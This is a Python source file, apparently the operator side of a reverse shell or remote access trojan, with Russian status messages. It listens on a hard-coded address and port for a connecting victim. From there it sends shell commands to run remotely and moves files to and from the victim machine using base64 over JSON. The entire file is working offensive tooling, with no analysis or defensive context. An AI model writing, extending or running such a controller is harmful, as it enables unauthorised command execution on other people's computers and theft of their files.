
import json
import socket
import base64
class Listener:
    def __init__(self, ip, port):
        
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(1)
        print("Ожидание соеденения.")
        self.connection, address = listener.accept()
        print('Успешно сoеденено' + str(address))
    def reliable_send(self, data):
        json_data = json.dumps(data).encode()
        self.connection.send(json_data)
    def reliable_receive(self):
        json_data = ''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('cp866')
                return json.loads(json_data)
            except ValueError:
                pass
    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == 'exit':
            self.connection.close()
            exit()
        
        return self.reliable_receive()
    def write_file(self, filename, content):
        with open(filename, 'wb') as file:
            file.write(base64.b64decode(content))
            return("Скачивание завершено")
    def read_file(self, filename):
        with open(filename, 'rb') as file:   
            return base64.b64encode(file.read())
    def run(self):
        while True:
            command = input(">>")
            command = command.split(" ")
            try:
                if command[0] == 'upload':
                    file_content = self.read_file(command[1]).decode('cp866')
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == 'download' and '[Errno 2]' not in result:
                    result = self.write_file(command[1],result)
            except Exception:
                result = 'ОШИБКА'
            print(result)
            
            
my_listener = Listener('192.168.1.40', 9899)
my_listener.run()